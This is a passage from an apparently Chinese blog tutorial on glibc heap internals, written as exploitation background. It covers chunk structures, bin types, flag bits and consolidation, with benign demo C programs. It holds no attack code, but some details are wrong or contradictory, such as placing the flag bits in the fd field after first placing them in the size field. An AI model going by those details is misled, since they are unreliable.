int的二进制位比数组总元素少，但是系统不会有那么多的bin链，不需要考虑这个问题</li>\n</ul>\n</blockquote>\n<h4 id=\"3-heap-info\"><a href=\"#3-heap-info\" class=\"headerlink\" title=\"3.heap_info\"></a>3.<strong>heap_info</strong></h4><ul>\n<li>我们知道一个线程可以包含多个堆段，这些堆段同属于一个舞台来管理。每个堆段的信息就是用这个结构体来表示的</li>\n<li><strong>注意：</strong>这个不是存储堆块的数据，而是来解释说明这个堆段的</li>\n</ul>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">heap_info</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">  mstate ar_ptr;            <span class=\"comment\">/* Arena for this heap. */</span></span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">heap_info</span> *<span class=\"title\">prev</span>;</span>  <span class=\"comment\">/* Previous heap. */</span></span><br><span class=\"line\">  <span class=\"keyword\">size_t</span> <span class=\"built_in\">size</span>;              <span class=\"comment\">/* Current size in bytes. */</span></span><br><span class=\"line\">  <span class=\"keyword\">size_t</span> mprotect_size;     <span class=\"comment\">/* Size in bytes that has been mprotected</span></span><br><span class=\"line\"><span class=\"comment\">                             PROT_READ|PROT_WRITE.  */</span></span><br><span class=\"line\">  <span class=\"comment\">/* Make sure the following data is properly aligned, particularly</span></span><br><span class=\"line\"><span class=\"comment\">     that sizeof (heap_info) + 2 * SIZE_SZ is a multiple of</span></span><br><span class=\"line\"><span class=\"comment\">     MALLOC_ALIGNMENT. */</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> pad[<span class=\"number\">-6</span> * SIZE_SZ &amp; MALLOC_ALIGN_MASK];</span><br><span class=\"line\">&#125; heap_info;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<ul>\n<li><strong>ar_ptr：</strong>此堆段归属于哪一个arnea管理</li>\n<li><strong>prev：</strong>前一个堆段</li>\n</ul>\n</blockquote>\n<h4 id=\"4-malloc-chunk\"><a href=\"#4-malloc-chunk\" class=\"headerlink\" title=\"4.malloc_chunk\"></a>4.malloc_chunk</h4><ul>\n<li>一个堆块被分为多个块，这些块就是用这些结构体表示的，这个才是我们在glibc的正真存储堆数据信息的结构体</li>\n</ul>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">malloc_chunk</span> &#123;</span></span><br><span class=\"line\"> </span><br><span class=\"line\">  INTERNAL_SIZE_T      mchunk_prev_size;  <span class=\"comment\">/* Size of previous chunk (if free).*/</span></span><br><span class=\"line\">  INTERNAL_SIZE_T      mchunk_size;       <span class=\"comment\">/* Size in bytes, including overhead.*/</span></span><br><span class=\"line\"> </span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">malloc_chunk</span>* <span class=\"title\">fd</span>;</span>   <span class=\"comment\">/* double links -- used only if free. */</span></span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">malloc_chunk</span>* <span class=\"title\">bk</span>;</span></span><br><span class=\"line\"> </span><br><span class=\"line\">  <span class=\"comment\">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">malloc_chunk</span>* <span class=\"title\">fd_nextsize</span>;</span> <span class=\"comment\">/* double links -- used only if free. */</span></span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">malloc_chunk</span>* <span class=\"title\">bk_nextsize</span>;</span></span><br><span class=\"line\"> </span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<ul>\n<li><p>每个成员都是8字节（64位系统中），4字节（32位系统中）</p>\n</li>\n<li><p><strong>mchunk_prev_size：</strong>只有当该chunk的物理相邻的前一地址chunk是空闲的话，该字段在本chunk中才有用，用来记录前一个chunk 的大小 (包括chunk头)。否则，该字段为0是没有用的；但是当前一个chunk申请的大小大于前一个chunk的大小时，那么该字段可以用来给前一个chunk使用（这就是chunk的空间复用，后面文章介绍）</p>\n</li>\n<li><strong>mchunk_size：</strong>当前chunk的大小，chunk大小都是8字节对齐</li>\n</ul>\n</blockquote>\n<p>这里我们来看一下gdb调试的界面</p>\n<p>源码如下</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;malloc.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">char</span> *p;</span><br><span class=\"line\">        p = <span class=\"built_in\">malloc</span>(<span class=\"number\">10</span>);</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">char</span> *H;</span><br><span class=\"line\">    H = <span class=\"built_in\">malloc</span>(<span class=\"number\">64</span>);</span><br><span class=\"line\">    <span class=\"built_in\">memcpy</span>(H,<span class=\"string\">\"aaaaaaaaaaaaaaaa\"</span>,<span class=\"number\">16</span>);</span><br><span class=\"line\">    <span class=\"built_in\">free</span>(H);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">gcc -o a.out a.c#<span class=\"number\">64</span>位</span><br><span class=\"line\">gcc -m32 -o b.out b.c#<span class=\"number\">32</span>位</span><br></pre></td></tr></table></figure>\n<p>64位</p>\n<p><img src=\"/2020/12/15/%E5%A0%86/image-20201212004040135.png\" alt=\"image-20201212004040135\"></p>\n<p>32位</p>\n<p><img src=\"/2020/12/15/%E5%A0%86/image-20201212004126045.png\" alt=\"image-20201212004126045\"></p>\n<blockquote>\n<p><strong>当前chunk处于分配状态时：</strong></p>\n<ul>\n<li>fd：从fd字段开始的是用户的数据</li>\n</ul>\n<p><strong>当前chunk处于空闲时：</strong></p>\n<p>因为chunk处于空闲时，会被放到bin链中，所以fd和bk用于指向自己所在bin链中前后的空闲chunk</p>\n<ul>\n<li>fd：指向前一个（非物理相邻）空闲的 chunk的指针（头指针）</li>\n<li>bk：指向后一个（非物理相邻）空闲的 chunk的指针</li>\n<li>通过fd和bk可以将空闲的chunk块加入到空闲的chunk块链表进行统一管理</li>\n</ul>\n<p><strong>fd_nextsize、bk_nextsize</strong></p>\n<p>也是只有chunk空闲的时候才使用，不过其用于较大的chunk（large chunk）</p>\n<ul>\n<li>fd_nextsize：指向前一个与当前 chunk 大小不同的第一个空闲块，不包含bin的头指针</li>\n<li>bk_nextsize：指向后一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针</li>\n</ul>\n<p>一般空闲的 large chunk 在 fd 的遍历顺序中，按照由大到小的顺序排列。这样做可以避免在寻找合适 chunk 时挨个遍历</p>\n</blockquote>\n<h5 id=\"malloc-chunk的内存分配大小\"><a href=\"#malloc-chunk的内存分配大小\" class=\"headerlink\" title=\"malloc_chunk的内存分配大小\"></a>malloc_chunk的内存分配大小</h5><p><strong>最小的空间：</strong>mchunk_prev_size字段 + mchunk_size字段 + fd字段 + bk字段 所需要的空间。所以64位系统最低需要 4 * SIZE_SZ = 32字节；32位系统是16字节</p>\n<p><strong>实际空间：</strong>malloc大小 + chunk对齐规则 + mchunk_prev_size字段 + mchunk_size字段 + 下一个chunk的mchunk_prev_size成员空间</p>\n<p>chunk的数据结构大小的图（64位系统）</p>\n<p><img src=\"/2020/12/15/%E5%A0%86/20201106174934849.jpg\" alt=\"img\"></p>\n<h5 id=\"mchunk-size的标记位的复用\"><a href=\"#mchunk-size的标记位的复用\" class=\"headerlink\" title=\"mchunk_size的标记位的复用\"></a>mchunk_size的标记位的复用</h5><p>mchunk_size在64位系统下是8个字节，字段的最后三个bit位，复用用作了（AMP）的标记位置。后三位bit位的复用，不会影响size的数据大小</p>\n<ul>\n<li>A：A=0 为主分区分配，A=1 为非主分区分配，参见后面</li>\n<li>M：M=1表示使用mmap映射区域，M=0为使用heap区域</li>\n<li>P：P=0 表示pre_chunk空闲，mchunk_prev_size才有效</li>\n</ul>\n<h3 id=\"0x04-chunk的分类\"><a href=\"#0x04-chunk的分类\" class=\"headerlink\" title=\"0x04 chunk的分类\"></a>0x04 chunk的分类</h3><h4 id=\"1-allocated-chunk\"><a href=\"#1-allocated-chunk\" class=\"headerlink\" title=\"1.allocated chunk\"></a>1.allocated chunk</h4><p>当前chunk是被应用层用户所使用的</p>\n<h4 id=\"2-free-chunk\"><a href=\"#2-free-chunk\" class=\"headerlink\" title=\"2.free chunk\"></a>2.free chunk</h4><p>当前chunk是空闲的，没有被应用层用户所使用</p>\n<h4 id=\"3-top-chunk\"><a href=\"#3-top-chunk\" class=\"headerlink\" title=\"3.top chunk\"></a>3.<strong>top chunk</strong></h4><ul>\n<li><strong>概念：</strong>当一个chunk处于一个arena的最顶部(即最高内存地址处)的时候，就称之为top chunk</li>\n<li><strong>作用：</strong>该chunk并<strong>不属于任何</strong>bin，而是在系统当前的所有free chunk(无论那种bin)都无法满足用户请求的内存大小的时候，将此chunk当做一个应急消防员，分配给用户使用</li>\n<li><strong>分配的规则：</strong>如果top chunk的大小比用户请求的大小要大的话，就将该top chunk分作两部分：1）用户请求的chunk；2）剩余的部分成为新的top chunk。否则，就需要扩展heap或分配新的heap了——在main arena中通过sbrk扩展heap，而在thread arena中通过mmap分配新的heap</li>\n</ul>\n<h4 id=\"4-last-remainder-chunk\"><a href=\"#4-last-remainder-chunk\" class=\"headerlink\" title=\"4.last remainder chunk\"></a>4.last remainder chunk</h4><ul>\n<li><strong>它是怎么产生的：</strong>当用户请求的是一个small chunk，且该请求无法被small bin、unsorted bin满足的时候，就通过binmaps遍历bin查找最合适的chunk，如果该chunk有剩余部分的话，就将该剩余部分变成一个新的chunk加入到unsorted bin中，另外，<strong>再将该新的chunk变成新的last remainder chunk</strong></li>\n<li><strong>它的作用是什么：</strong>此类型的chunk用于提高连续malloc(small chunk)的效率，主要是提高内存分配的局部性。那么具体是怎么提高局部性的呢？举例说明。当用户请求一个small chunk，且该请求无法被small bin满足，那么就转而交由unsorted bin处理。同时，假设当前unsorted bin中只有一个chunk的话——就是last remainder chunk，那么就将该chunk分成两部分：前者分配给用户，剩下的部分放到unsorted bin中，并成为新的last remainder chunk。这样就保证了连续malloc(small chunk)中，各个small chunk在内存分布中是相邻的，即提高了内存分配的局部性</li>\n</ul>\n<h3 id=\"0x05-bins分类\"><a href=\"#0x05-bins分类\" class=\"headerlink\" title=\"0x05 bins分类\"></a>0x05 bins分类</h3><blockquote>\n<ul>\n<li>bin是一个由struct chunk结构体组成的链表</li>\n<li>前面介绍过，不同的chunk根据特点不同分为不同的chunk，为了将这些chunk进行分类的管理，glibc采用了bin链这种方式管理不同的chunk</li>\n<li>不同的bin链是由arena管理的</li>\n<li>bin链中的chunk均为free chunk</li>\n</ul>\n</blockquote>\n<h4 id=\"1-bin的malloc-state\"><a href=\"#1-bin的malloc-state\" class=\"headerlink\" title=\"1.bin的malloc_state\"></a>1.bin的malloc_state</h4><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">malloc_chunk</span>* <span class=\"title\">mchunkptr</span>;</span></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">malloc_chunk</span> *<span class=\"title\">mfastbinptr</span>;</span></span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">malloc_state</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span> </span><br><span class=\"line\">  ...</span><br><span class=\"line\">  <span class=\"comment\">/*other member*/</span></span><br><span class=\"line\">  ...</span><br><span class=\"line\"> </span><br><span class=\"line\">  <span class=\"comment\">/* Fastbins */</span></span><br><span class=\"line\">  mfastbinptr fastbinsY[NFASTBINS];</span><br><span class=\"line\"> </span><br><span class=\"line\">  <span class=\"comment\">/* Normal bins packed as described above */</span></span><br><span class=\"line\">  mchunkptr bins[NBINS * <span class=\"number\">2</span> - <span class=\"number\">2</span>];</span><br><span class=\"line\"> </span><br><span class=\"line\">  ...</span><br><span class=\"line\">  <span class=\"comment\">/*other member*/</span></span><br><span class=\"line\">  ...</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<ul>\n<li><strong>fastbinY数组：</strong>大小为10。记录的是fast bin链</li>\n<li><strong>bins数组：</strong>大小为129。记录的是unsorted bin（1）、small bin（2~63）、large bin链（64~126）</li>\n</ul>\n<h4 id=\"2-fastbin\"><a href=\"#2-fastbin\" class=\"headerlink\" title=\"2.fastbin\"></a>2.fastbin</h4><p><strong>概念：</strong>chunk的大小在32字节到128字节（0x20~0x80）的chunk称为“fast chunk（大小不是malloc时的大小，而是在内存中struct malloc_chunk的大小，包含前2个成员）</p>\n<ul>\n<li>fast bin链表的个数为10个</li>\n<li><strong>不会对free chunk进行合并：</strong>鉴于设计fast bin的初衷就是进行快速的小内存分配和释放，因此系统将属于<strong>fast bin的chunk的PREV_INUSE位总是设置为1</strong>，这样即使当fast bin中有某个chunk同一个free chunk相邻的时候，系统也不会进行自动合并操作，而是保留两者。虽然这样做可能会造成额外的碎片化问题，但瑕不掩瑜</li>\n<li>LIFO</li>\n</ul>\n<blockquote>\n<h3 id=\"fastbinsY数组存储fastbins的规则：\"><a href=\"#fastbinsY数组存储fastbins的规则：\" class=\"headerlink\" title=\"fastbinsY数组存储fastbins的规则：\"></a>fastbinsY数组存储fastbins的规则：</h3><ul>\n<li>每个fast bin链表都是单链表（使用fd指针）。因此，fast bin中无论是添加还是移除fast chunk，都是对“链表尾”进行操作，而不会对某个中间的fast chunk进行操作</li>\n<li>单个fastbin链表中的chunk大小都是相同的，各个fastbin链表中的chunk大小是不同的</li>\n</ul>\n<p><img src=\"/2020/12/15/%E5%A0%86/2019072416485849.png\" alt=\"img\"></p>\n</blockquote>\n<h4 id=\"3-unsorted-bin\"><a href=\"#3-unsorted-bin\" class=\"headerlink\" title=\"3.unsorted bin\"></a>3.unsorted bin</h4><p>当释放较小或较大的chunk的时候，如果系统没有将它们添加到对应的bins中，系统就将这些chunk添加到unsorted bin中。在堆管理器的unsorted bin 不为空时，<strong>用户申请非fast bin大小的内存</strong>会先从unsorted bin中查找，如果找到符合该申请大小要求的chunk，则直接分配或分割该chunk。</p>\n<ul>\n<li>unsorted bin的个数： 1个</li>\n<li>unsorted bin是一个由free chunks组成的循环双链表</li>\n<li>在unsorted bin中，对chunk的大小并没有限制，任何大小的chunk都可以归属到unsorted bin中</li>\n<li>unsortedbin采用的遍历顺序是FIFO</li>\n</ul>\n<p><img src=\"file://C:\\Users\\86138\\Music\\hexo\\source\\_posts\\PWN学习\\image-20201119163232880.png?lastModify=1607780072\" alt=\"image-20201119163232880\"></p>\n<h4 id=\"4-small-bin\"><a href=\"#4-small-bin\" class=\"headerlink\" title=\"4.small bin\"></a>4.small bin</h4><p><strong>概念</strong>：小于1024字节（0x400）的chunk称之为small chunk，small bin就是用于管理small chunk的</p>\n<ul>\n<li>small bin链表的个数为62个</li>\n<li>FIFO</li>\n<li><strong>循环双向链表</strong>，就内存的分配和释放速度而言，small bin比larger bin快，但比fast bin慢</li>\n</ul>\n<blockquote>\n<p><strong>Small bin链表</strong></p>\n<ul>\n<li>每个smallbin也是一个由对应free chunk组成的循环双链表</li>\n<li><strong>small bin采用FIFO(先入先出)算法：</strong>内存释放操作就将新释放的chunk添加到链表的front end(前端)，分配操作就从链表的rear end(尾端)中获取chunk</li>\n<li>单个smallbin链表中的chunk大小都是相同的，各个smallbin链表中的chunk大小是不同的，跟fastbinsY数组存储fastbin链的原理是相同的</li>\n</ul>\n<p><img src=\"/2020/12/15/%E5%A0%86/201907300808254.png\" alt=\"img\"></p>\n</blockquote>\n<h4 id=\"5-large-bin\"><a href=\"#5-large-bin\" class=\"headerlink\" title=\"5.large bin\"></a>5.large bin</h4><p><strong>概念：</strong>大于等于1024字节（0x400）的chunk称之为large chunk，large bin就是用于管理这些largechunk的</p>\n<ul>\n<li>large bin链表的个数为63个，被分为6组</li>\n<li>largechunk使用fd_nextsize、bk_nextsize连接起来的</li>\n</ul>\n<blockquote>\n<h3 id=\"Large-Bin链表\"><a href=\"#Large-Bin链表\" class=\"headerlink\" title=\"Large Bin链表\"></a>Large Bin链表</h3><ul>\n<li>同一个largebin中每个chunk的大小可以不一样，这些chunk根据一定的范围存储在一个larbin链表中</li>\n<li>large chunk可以添加、删除在large bin的任何一个位置</li>\n<li><strong>在这63个largebins中：</strong>第一组的32个largebin链<strong>依次以64字节步长为间隔，即第一个largebin链中chunksize为1024-1087字节，第二个large bin中chunk size为1088~1151字节。</strong>第二组的16个largebin链<strong>依次以512字节步长为间隔；</strong>第三组的8个largebin链<strong>以步长4096为间隔；</strong>第四组的4个largebin链<strong>以32768字节为间隔；</strong>第五组的2个largebin链<strong>以262144字节为间隔；</strong>最后一组**的largebin链中的chunk大小无限制</li>\n</ul>\n<p><img src=\"/2020/12/15/%E5%A0%86/20190730154304263.png\" alt=\"img\"></p>\n</blockquote>\n<p><img src=\"/2020/12/15/%E5%A0%86/20190724174830502.png\" alt=\"img\"></p>\n<h3 id=\"0x06-堆的调用流程\"><a href=\"#0x06-堆的调用流程\" class=\"headerlink\" title=\"0x06 堆的调用流程\"></a>0x06 堆的调用流程</h3><p><img src=\"/2020/12/15/%E5%A0%86/20190722153928310.png\" alt=\"img\"></p>\n<ul>\n<li><h4 id=\"当应用程序“第一次”使用malloc函数申请动态内存时，glibc库会向内核申请一块非常大的动态内存，这块动态内存会比malloc申请的大小大很多\"><a href=\"#当应用程序“第一次”使用malloc函数申请动态内存时，glibc库会向内核申请一块非常大的动态内存，这块动态内存会比malloc申请的大小大很多\" class=\"headerlink\" title=\"当应用程序“第一次”使用malloc函数申请动态内存时，glibc库会向内核申请一块非常大的动态内存，这块动态内存会比malloc申请的大小大很多\"></a>当应用程序<strong>“第一次”</strong>使用malloc函数申请动态内存时，glibc库会向内核申请一块非常大的动态内存，这块动态内存会比malloc申请的大小大很多</h4></li>\n<li><p>glibc申请到这块大的内存之后，根据malloc需要的大小，然后切割相应的大小给应用程序malloc函数使用</p>\n</li>\n<li><p>当应用层free之后，会将刚才使用到的动态内存返回给glibc，但是返回的内存不是返回给top chunk，而是由bins链管理</p>\n</li>\n<li><p>当程序再次malloc时，会从刚才申请的很大的动态内存去取，不会再去向内核申请内存</p>\n</li>\n<li><p>只有当第一次申请的动态内存使用完时，glibc才会再次通过brk/mmap系统调用向内核去要内存</p>\n</li>\n</ul>\n<h3 id=\"0x07-chunk的标志位\"><a href=\"#0x07-chunk的标志位\" class=\"headerlink\" title=\"0x07 chunk的标志位\"></a>0x07 chunk的标志位</h3><h4 id=\"1-简介\"><a href=\"#1-简介\" class=\"headerlink\" title=\"1.简介\"></a>1.简介</h4><ul>\n<li><strong>NON_MAIN_ARENA：</strong>记录当前 chunk 是否不属于主线程</li>\n<li><strong>IS_MAPPED：</strong>记录当前chunk是否是由mmap分配的</li>\n<li><strong>PREV_INUSE：</strong>如果前面一个chunk处于分配状态，那么此位为1。一般来说，堆中第一个被分配的内存块的 size 字段的 P 位都会被设置为 1，以便于防止访问前面的非法内存。当一个chunk 的size 的P位为0时，我们能通过 prev_size 字段来获取上一个 chunk 的大小以及地址。这也方便进行空闲chunk之间的合并</li>\n</ul>\n<h4 id=\"2-实现\"><a href=\"#2-实现\" class=\"headerlink\" title=\"2.实现\"></a>2.实现</h4><ul>\n<li><strong>在64位系统中为16字节对齐</strong>，<strong>在32位的系统中为8字节对齐</strong>。因此在64位系统中，struct malloc_chunk结构体的大小的最后4个位数是没有被使用的，32位系统中，最后3个位数是没有被使用的。</li>\n</ul>\n<p><img src=\"/2020/12/15/%E5%A0%86/2019072217303470.png\" alt=\"img\"></p>\n<ul>\n<li>所以，glibc用struct malloc_chunk结构体的fd成员的最后3个比特位来表示当前chunk处于什么状态。只需要将fd成员相应的比特位置为1，就可以代表当前chunk处于什么状态</li>\n</ul>\n<h4 id=\"3-PREV-INUSE位导致的chunk合并\"><a href=\"#3-PREV-INUSE位导致的chunk合并\" class=\"headerlink\" title=\"3.PREV_INUSE位导致的chunk合并\"></a>3.PREV_INUSE位导致的chunk合并</h4><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> prev_inuse(p)       ((p)-&gt;mchunk_size &amp; PREV_INUSE)</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"keyword\">static</span> <span class=\"keyword\">void</span></span><br><span class=\"line\">_int_free (mstate av, mchunkptr p, <span class=\"keyword\">int</span> have_lock)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"comment\">/* consolidate backward */</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!prev_inuse(p)) &#123;</span><br><span class=\"line\">        prevsize = prev_size (p);                   <span class=\"comment\">//1</span></span><br><span class=\"line\">        <span class=\"built_in\">size</span> += prevsize;                           <span class=\"comment\">//2</span></span><br><span class=\"line\">        p = chunk_at_offset(p, -((<span class=\"keyword\">long</span>) prevsize)); <span class=\"comment\">//3</span></span><br><span class=\"line\">        unlink(av, p, bck, fwd);                    <span class=\"comment\">//4</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>首先使用prev_inuse宏定义判断p的PREV_INUSE位是否为0</li>\n<li>如果PREV_INUSE位为0，那么prev_inuse宏返回0，if条件为1，进入if语句体中</li>\n<li>1.通过recv_size函数得到前面要合并的chunk的大小</li>\n<li>2.将自己的大小与前面的presize相加得到合并后的chunk的大小</li>\n<li>3.将p的指针向前移动，移动到前面那个chunk的开头处</li>\n<li>4.unlink是将两个要合并的chunk各自从原来的bin链上面断下来，然后进行合并</li>\n</ul>\n<h4 id=\"4-fast-chunk的PREV-INUSE\"><a href=\"#4-fast-chunk的PREV-INUSE\" class=\"headerlink\" title=\"4.fast chunk的PREV_INUSE\"></a>4.fast chunk的PREV_INUSE</h4><ul>\n<li>①无论fastchunk前面的chunk是否处于分配状态，PREV_INUSE始终为1。因为系统不希望fastchunk与前面的chunk之间进行合并</li>\n<li>②不论当前的fastchunk是否处于分配状态，该chunk后面的chunk的PREV_INUSE位一定为1，也是为了防止后面的chunk与fastchunk合并</li>\n</ul>\n<h4 id=\"5-演示\"><a href=\"#5-演示\" class=\"headerlink\" title=\"5.演示\"></a>5.演示</h4><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;malloc.h&gt;</span></span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> <span class=\"built_in\">size</span>=<span class=\"number\">0x70</span>;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">void</span> *p1=<span class=\"built_in\">malloc</span>(<span class=\"built_in\">size</span>);</span><br><span class=\"line\">    <span class=\"keyword\">void</span> *p2=<span class=\"built_in\">malloc</span>(<span class=\"built_in\">size</span>);</span><br><span class=\"line\">    <span class=\"keyword\">void</span> *p3=<span class=\"built_in\">malloc</span>(<span class=\"built_in\">size</span>); <span class=\"comment\">//为了达到演示效果，防止合并后的chunk与top chunk合并</span></span><br><span class=\"line\"> </span><br><span class=\"line\">    sleep(<span class=\"number\">0</span>);  <span class=\"comment\">//只为了打断点使用，无其他用处</span></span><br><span class=\"line\">    <span class=\"built_in\">free</span>(p1);    </span><br><span class=\"line\">    <span class=\"built_in\">free</span>(p2);   </span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>可以看到正好分配了3块</p>\n<p><img src=\"/2020/12/15/%E5%A0%86/image-20201214183532647.png\" alt=\"image-20201214183532647\"></p>\n<p>看一下内存地址</p>\n<p><img src=\"/2020/12/15/%E5%A0%86/image-20201214183701946.png\" alt=\"image-20201214183701946\"></p>\n<p>当我们释放一个之后</p>\n<p>这里版本较高  淦 我先去找个虚拟机</p>\n<p>可以看到是加到tcache中</p>\n<p><img src=\"/2020/12/15/%E5%A0%86/image-20201214183930779.png\" alt=\"image-20201214183930779\"></p>\n<hr>\n<p>弄了一晚上 我又回来了</p>\n<p>释放第一个</p>\n<p><img src=\"/2020/12/15/%E5%A0%86/image-20201214221400402.png\" alt=\"image-20201214221400402\"></p>\n<p>释放两个</p>\n<p><img src=\"/2020/12/15/%E5%A0%86/image-20201214221458119.png\" alt=\"image-20201214221458119\"></p>\n<h3 id=\"0x08-chunk的mchunk-prev-size成员的空间复用\"><a href=\"#0x08-chunk的mchunk-prev-size成员的空间复用\" class=\"headerlink\" title=\"0x08 chunk的mchunk_prev_size成员的空间复用\"></a>0x08 chunk的mchunk_prev_size成员的空间复用</h3><h4 id=\"1-介绍\"><a href=\"#1-介绍\" class=\"headerlink\" title=\"1.介绍\"></a>1.介绍</h4><ul>\n<li>①如果本chunk前面一个chunk处于空闲状态，那么mchunk_prev_size成员才有用，此时用来记录前一个chunk的大小</li>\n<li>②如果本chunk前面一个chunk处于使用状态，那么mchunk_prev_size成员对于本chunk来说是不使用的</li>\n</ul>\n<h4 id=\"2-实现-1\"><a href=\"#2-实现-1\" class=\"headerlink\" title=\"2.实现\"></a>2.实现</h4><ul>\n<li>当前一个chunk申请的数据空间申请的大小对16取余后，如果多出来的大小小于等于8字节，那么这个多出来的大小就放入下一个chunk的mchunk_prev_size中存储</li>\n<li>否则，如果多出来的大小大于8字节，那么前一个chunk就不使用下一个chunk的mchunk_prev_size成员</li>\n</ul>\n<p><img src=\"/2020/12/15/%E5%A0%86/20190724195005380.png\" alt=\"img\"></p>\n<h4 id=\"3-演示\"><a href=\"#3-演示\" class=\"headerlink\" title=\"3.演示\"></a>3.演示</h4><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span 